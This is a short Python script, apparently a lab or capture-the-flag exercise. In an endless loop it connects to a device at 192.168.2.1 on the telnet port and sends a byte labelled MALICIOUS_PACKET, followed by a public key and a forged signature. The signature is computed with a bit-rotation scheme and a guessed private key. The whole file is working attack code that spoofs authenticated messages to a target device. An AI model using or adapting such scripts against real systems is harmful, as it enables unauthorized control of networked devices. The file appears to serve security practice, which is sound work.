import socket
import time

def rotl(value, count):
    value <<= count
    overflow = value & 0xff00
    value &= 0x00ff
    value |= overflow >> 8
    return value


ID = 2
MALICIOUS_PACKET = (ID << 4) | 0b1111
TARGET_ADDRESS = ("192.168.2.1", 23)
PUBLIC_KEY = 2
PRIVATE_KEY = 32  # unknown, so guess a value


while True:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        print('connecting')
        sock.connect(TARGET_ADDRESS)
        print(f'sending {MALICIOUS_PACKET:08b} ({MALICIOUS_PACKET}, #{MALICIOUS_PACKET:x})')
        sock.send(MALICIOUS_PACKET.to_bytes())
        sock.send(PUBLIC_KEY.to_bytes())
        signature = rotl(MALICIOUS_PACKET, PRIVATE_KEY)
        sock.send(signature.to_bytes())
        print('closing')
    time.sleep(0.5)

